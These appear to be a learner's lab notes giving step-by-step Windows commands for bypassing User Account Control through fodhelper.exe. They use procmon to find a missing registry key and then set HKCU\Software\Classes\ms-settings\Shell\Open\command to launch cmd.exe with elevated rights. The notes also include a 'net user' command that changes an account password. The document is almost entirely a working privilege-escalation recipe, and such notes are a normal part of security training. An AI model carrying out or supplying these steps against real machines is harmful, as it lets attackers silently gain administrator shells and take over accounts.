
c:\Users\admin>whoami /groups

C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs ----> switch to a high integrity level

C:\Windows\system32> net user admin Ev!lpass ----> change password

ByPass UAC:
-----------

fodhelper.exe ---> Microsoft support application responsible for managing language changes in the operating system

1. C:\Users\admin>C:\Windows\System32\fodhelper.exe

2. C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe ---> inspect its application manifest

3. run procmon in sysunternals: procmon.exe

4. set filter in procmon: process name is fodhelper.exe

5. run fodhelper.exe again

6. add another filter: operation contains Reg

7. run fodhelper.exe again

8. add onother filter in procmon: result is NAME NOT FOUND

9. add anothe procmon filter: Path contains HKCU

10. modifiy path filetr: Path contains ms-settings\shell\open\command

11. remove Result filter

11a. run fodhelper again 

11a. open regedit 

11b. search HKCR:ms-settings\shell\open\command

12. C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command

13. restart fodhelper.exe

14. C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ

15. C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

16. running fodhelper.exe once again, we are presented with a command shell
